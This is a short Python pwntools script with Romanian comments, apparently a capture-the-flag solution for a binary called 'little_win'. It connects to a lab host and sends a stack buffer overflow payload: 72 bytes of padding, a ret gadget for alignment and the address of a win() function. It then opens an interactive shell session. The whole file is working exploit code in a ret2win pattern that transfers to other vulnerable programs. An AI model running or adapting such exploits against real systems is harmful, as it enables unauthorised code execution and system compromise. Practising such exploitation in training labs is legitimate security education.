#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = "10.213.0.102"
PORT = 59270  # Actualizează cu portul real

# Load binary
elf = ELF('./little_win')  # Numele binary-ului tău

# Găsim adresele necesare
win_addr = elf.symbols['win']
main_addr = elf.symbols['main']

# Găsim ROP gadgets
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

log.info(f"Win address: {hex(win_addr)}")
log.info(f"Main address: {hex(main_addr)}")
log.info(f"RET gadget: {hex(ret)}")

# Conectare
p = remote(HOST, PORT)

p.recvuntil(b'pet name\n')

# Payload simplu - avem funcția win() deja
offset = 72  # 64 bytes buffer + 8 bytes saved rbp

payload = b'A' * offset
payload += p64(ret)      # Stack alignment
payload += p64(win_addr) # Call win()

p.sendline(payload)

# Shell!
p.interactive()